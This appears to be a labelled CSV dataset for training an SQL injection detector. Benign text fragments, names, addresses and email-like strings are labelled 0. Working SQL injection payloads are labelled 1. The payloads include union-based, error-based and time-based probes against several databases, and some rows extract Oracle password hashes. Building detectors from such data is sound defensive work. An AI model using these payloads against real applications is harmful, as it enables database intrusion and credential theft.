Sentence,Label
reinhard,0
"1 )  where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",1
83,0
"1' )  where 5883 = 5883 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
gelis,0
"1'+ ( select 'ayod' where 7839 = 7839 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  +'",1
2813,0
" Trekking mud , rivers jungle provide free medical care Dr",0
"1'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'ogwd' like 'ogwd",1
paulus,0
 He still accused passing secret information without authorisation ,0
s46085i9_s9,0
haroldo,0
1' and 7533 = 7533,1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""%"" = """,1
kotler,0
scherzin,0
04271,0
 It seems attack preceded car chase involving several cars ,0
"1"" where 1140 = 1140 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
 Clive Palmer claims PM Tony Abbott conflict interest parental leave scheme Billionaire MP Clive Palmer says Prime Minister Tony Abbott conflict interest parental leave scheme daughters might get pregnant benefit ,0
luciano nagel,0
"-5073"" )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""kbab"" like ""kbab",1
"-9514  )  )   as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",1
8400067402160298,0
"1' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 'osov' like 'osov",1
 The pair managed break away field keeping expectations ,0
"-9286""  )  )   as mfxl where 9348 = 9348 union all select 9348#",1
guadalcanal,0
afasia,0
"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and 'usnh' like 'usnh",1
 Costumes expected account $ 1,0
"-9725' )  union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",1
" select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
"de l' aliga 3,",0
"1'  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( 'owot' = 'owot",1
serene,0
"-9854 )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 5696 = 5696",1
3128013884204713,0
" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1
atanaspulos,0
"jose gomez gallito, 107,",0
50344,0
"1"" )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""wfwg"" like ""wfwg",1
"1"" )  where 4567 = 4567 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
" &quot; Such case Jim Bruce , 36-year-old writer Montana , born XY male chromosomes ambiguous genitals ",0
jovn,0
"1""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
shuster,0
"1' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'wdeu' like 'wdeu",1
" Furthermore , last year listing Facebook stock exchange caused quite furore ",0
domingo,0
costana,0
14100,0
allaert@chicasdiabolo.ru,0
select  ( case when  ( 8642 = 6049 )  then 1 else 8642* ( select 8642 from master..sysdatabases )  end ) --,1
"1""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
20847295a,0
1' )  and 7533 = 7533 and  ( 'dbjq' = 'dbjq,1
44651,0
9783618046984809,0
"1"" )  where 3058 = 3058 union all select null--",1
7297834291786721,0
"select * from generate_series ( 7536,7536,case when  ( 7536 = 7523 )  then 1 else 0 end )  limit 1--",1
cab,0
"1  )  )   union all select null,null,null,null,null,null--",1
gloriano,0
" As , pair complement one another superbly ",0
18178277c,0
" Lucky us , &quot; baby pumpkin trend &quot; started last year thanks Pinterest , us grew carving gourds sitting ",0
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and ""xbft"" = ""xbft",1
"-5640""  )  )   or 9792 = 2728--",1
47160,0
espinosa de cerrato,0
 For sufficient number educational places provided need skilled workers covered ,0
"-4325' or make_set ( 9354 = 9354,7185 ) ",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
diminucin,0
2o0eri23,0
zarlenga,0
stader-sablon6@miami-beach.ag,0
mendie,0
21924971z,0
7723056495790878,0
transbordar,0
"jose maria mortes lerma, 151 11-d",0
76971829y,0
31790,0
recabdador,0
"-4032""  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""olox"" = ""olox",1
"-9928""  )  )   union all select 7511,7511,7511,7511,7511,7511,7511,7511#",1
baldellou,0
samanieg mitteenn,0
95866747x,0
pandulfo,0
1370,0
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
gros pal,0
kerlovic,0
" &quot; Was matter discussed course telephone conversations development commercial lease policy , &quot; Assistant Commissioner Anthony Whealy asked Mr Tripodi ",0
sicotte@sevach.yu,0
yamuza ezama,0
"1'|| ( select 'bpml' where 7360 = 7360 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1
"1' where 4880 = 4880 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
cerna sennacherribbo,0
"1'|| ( select 'qued' where 9801 = 9801 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'nbsr' like 'nbsr",1
-6190'  )  )   )  union all select 9413--,1
1'+ ( select 'vddk' where 6961 = 6961,1
"1"" )  where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#",1
40171,0
whit,0
2403,0
9491,0
9521659963163883,0
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
sharmila,0
"1"" )  where 5698 = 5698 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
rosita,0
guerra_russinov@weat.fj,0
0urifica2er0,0
cazalegas,0
8485,0
costur,0
4970113242543246,0
selbrede,0
" And: &apos; Without sound knowledge local language , even become lonely living dolce vita , &apos; added author , providing food thought seeking move abroad ",0
97lea0,0
 We built festival way continuing work ,0
"murillo, 185 2f",0
llobet,0
" Net orders fell 26 aircraft , 83 ",0
"com/wp-includes/online-mc, PRODUCT409 PRODUCT409 %EB%B0%95%EC%A3%BC%ED%98%B8 %ED%99%8D%EA%B8%B8%EB%8F%99 %ED%99%8D%EA%B8%B8%EA%B0%80 %ED%99%8D%EA%B8%B8%EB%82%98 %ED%99%8D%EA%B8%B8%EB%8B%A4 %ED%99%8D%EA%B8%B8%EB%9D%BC %ED%99%8D%EA%B8%B8%EB%A7%88 %ED%99%8D%EA%B8%B8%EB%B0%94 %ED%99%8D%EA%B8%B8%EC%82%AC %ED%99%8D%EA%B8%B8%EC%95%84 %ED%99%8D%EA%B8%B8%EC%9E%90 %ED%99%8D%EC%A7%88%EC%B0%A8%ED%99%8D%EC%A7%88%EC%B0%A8 & & =  (주)나빠요하하 ******* ********* ********** *********** ************** *************** +5hIp5/XQSe0q9x4@V$K@xbLIzU9CXs34UqM8@V$K@B9PWaIyA1ZscZc0tdMH@V$K@xbLIzU9CXs34UqM8 -----------------------------7e110e370ece -----------------------------7e115a25c0784 -----------------------------7e1161151f9e -----------------------------7e123d150600 -----------------------------7e12422e2 -----------------------------7e12422e2c090a -----------------------------7e12b2f1e1098 -----------------------------7e12db131 -----------------------------7e12db131f238a -----------------------------7e13482d1 -----------------------------7e13482d1b1020 -----------------------------7e135771c0f0c -----------------------------7e17a8320a4 -----------------------------7e1846d0fba -----------------------------7e196581600 -----------------------------7e1c7582640 ------WebKitFormBoundaryxqnD09MP6AAoISHj ",0
"passatge leon, 93 8?a",0
poblacin de campos,0
8702699962501028,0
"select pg_sleep ( 5 )  and  ( ""%"" = """,1
chang-kang@juegois.sh,0
4ino57l,0
"c/ forjadores, 131",0
andrzej,0
"almendro, 28 6?c",0
jacobsen,0
calle montes claros 9,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq ) -- mmjk,1
5exas9labo,0
"1' )  where 6772 = 6772 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
1' )  where 7908 = 7908 or sleep ( 5 ) --,1
montagnani_walling@am-si.sh,0
"1' where 6795 = 6795 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1%' )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( '%' = '",1
chaurett,0
compatrn,0
 Director Jens Hasselmann old man boat perform front Fischerdorf ,0
mallat paiva,0
"-5779 )  union all select 6089,6089--",1
larenas derch,0
29360,0
' or '' = ',1
"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""svse"" = ""svse",1
cubillas de santa marta,0
1 where 2239 = 2239 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
 select sleep ( 5 )  and 'mlmu' = 'mlmu,1
39419,0
8744,0
"1' and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
samar,0
" &quot; &quot; A lot activists concerned German rule encourage parents make quick decisions give child &apos; undetermined , &apos; &quot; said ",0
1 )  as xylu where 3338 = 3338 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1
47690,0
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'dzzx' = 'dzzx",1
"1""  )  )   as oxrr where 6141 = 6141 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
brasfield@elcarritodelacompra.hk,0
"-4127%' union all select 9558,9558,9558#",1
magnin_arne@tiebreak.com.sr,0
alicante,0
3947,0
"c/ los mimbres, 31",0
carretera rubi 106,0
" NSA revelations boost corporate paranoia state surveillance On mild day late August German police helicopter buzzed low US consulate Frankfurt , financial capital Germany ",0
 And I close book ,0
364,0
56597686e,0
22618043g,0
"select * from generate_series ( 7407,7407,case when  ( 7407 = 6562 )  then 1 else 0 end )  limit 1--",1
"-7559"" or 8792 = 6905--",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (  6977 = 6977",1
"1"" and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
83154874f,0
"1  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
" It &apos;s book I thought would uplift doldrums second-year medical school , renew sense hope ",0
"1%""  )  )   rlike sleep ( 5 )  and   (  (  ""%"" = """,1
3591958882412356,0
34111,0
choong,0
setin cardona,0
" The school yard renovation originally planned back 2008 / 2009 , however , high unplanned expenses meant work pushed back ",0
" Highland Games Kaltenhof Alongside brake van pulling tractors , also second contest agricultural autumn festival Kaltenhof 6 8 September ",0
24566,0
1571256483586961,0
"1 )  where 8671 = 8671 and make_set ( 4931 = 1642,1642 ) --",1
"1"" )  where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" )  as eaxo where 2728 = 2728",1
1' and  ( 1088 = 7530 ) *7530 and 'xkfu' = 'xkfu,1
exec xp,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
asc60ca,0
"royo, el",0
grimm@madrid2012.nu,0
tauro 34 7b,0
hani,0
72ic5oid4,0
11639,0
"-6194"" or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
c358ra,0
fram,0
") predict punctuation symbols speech recognition, Huang Zweig (2002) uses maximum entropy model, Christensen et al",0
44432,0
gere.pratsch-kaufmann@rubirubi.sj,0
bullen,0
incom1a5abl8mente,0
bordagorry,0
lightfie,0
rurick5,0
sellees,0
-9024 )  where 1686 = 1686 or 3069 = 8213--,1
davril_pallin0@evelin.com.cz,0
re7ango,0
"1"" )  and 4760 = 2922",1
 I really feel follow footsteps guys ,0
potts,0
san vicente de la cabeza,0
1075444051965041,0
%29,1
 The story-teller taking younger guests wonderful world fairytale 11,0
"-2704"" )  union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1
"1"" )  where 4951 = 4951",1
"1'  )  )   as hrra where 9533 = 9533 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
9448,0
1%' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
acedera,0
x' and 1 =  ( select count ( * )  from tabname ) ; --,1
7291605361624408,0
"1"" where 6200 = 6200 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
1'  )  )   or sleep ( 5 )  and   (  (  'taaj' = 'taaj,1
"c/ venus 91, 1e",0
walberg@ytv.com.gn,0
" The traffic lights actually defective , rather turned green minutes later ",0
 select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1
"1%""  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  ""%"" = """,1
"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
8115,0
"1 )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 8929 = 8929",1
freixes navaln,0
he53e9ona,0
aylln tamallangos,0
martn del ro,0
avda. fernando ferrerio s/n,0
"1"" )  where 7452 = 7452",1
adulatorio,0
" This would suit young people today , career , meaningful job well ",0
teresa,0
-2039' )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1
-2717'  )  )   )  or 8571 = 8571--,1
1' where 4253 = 4253,1
vall de ebo,0
anny,0
"gregoria hernandez 67, 13g",0
torell berber,0
kuhn cota,0
" In May voted overturn cuts ordered national salaries commission reinstate hefty salaries around 532,000 shillings month tax-free - ranked among highest world ",0
" And another research paper University Victoria Canada , said: &quot; Dogs likely approach robot dog &apos; tail &apos; made wag left rather right , rather becoming anxious - opposite way around Italian study ",0
0ocal2za0i3n,0
oastler,0
"1%"" )  order by 1--",1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 1105 = 1105",1
" However , pawnbrokers advantage requiring credit checks proof salary , arrange loans faster banks ",0
36914497a,0
16878,0
20709,0
orieta,0
04100,0
" The possibilities , however , limited - Cheops small mission budget 150 million Euro ",0
"-1591 where 3291 = 3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
"c/ fernan gonzalez, 45 13-b",0
00 p,0
tra5i0o0ed7a,0
"1"" )  where 7919 = 7919 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
8e6a74aer,0
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and 'egye' = 'egye",1
"-6667%""  )  )   union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1
0er_rugneo,0
"entrada el zurdo, 166 7?e",0
"1%'  )  )   )  union all select null,null,null,null,null#",1
 Miranda Kerr Orlando Bloom parents two-year-old Flynn ,0
yates@tgcprint.ax,0
"1"" )  as oijn where 1521 = 1521 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
bradney4,0
testua,0
"guipuzcoa 198, 1?d",0
26586,0
"1%""  )  )   union all select null,null,null,null#",1
"alfalfa 47,",0
12450,0
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) ",1
irina,0
1 )  where 9078 = 9078 rlike sleep ( 5 ) #,1
v2e2udo,0
"1 )  where 6082 = 6082 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
pajo,0
25410,0
2un4141ali46r,0
" Supreme Court upholds Obama health care law In major victory Obama administration , US Supreme Court today ruled Barack Obama &apos;s signature health care law constitutional ",0
"1'+ ( select 'aphz' where 1933 = 1933 union all select null,null,null,null,null,null#",1
1'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  'hqcz' = 'hqcz,1
rubio,0
"vid y barrios, la",0
1%'  )  )   )  or sleep ( 5 ) #,1
 or 2 > 1,1
"1%"" )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1
"c/ jose belso castao, s/n,",0
 or '7659' = '7659,1
pasaje america 189 4?a,0
muntada,0
"1"" )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""ctzh"" = ""ctzh",1
" Already stamp duty take residential property boroughs Westminster Kensington &amp; Chelsea , stood £ 708 million 2012 / 13 tax year , exceeds combined total Northern Ireland , Wales , Scotland , North East , North West Yorkshire Humber put together ",0
1'  )  )   as wjfj where 3802 = 3802,1
" Prime property - top 5% 10% housing market price - affluent south-west London belt , stretches Fulham Wimbledon , increased record 11",0
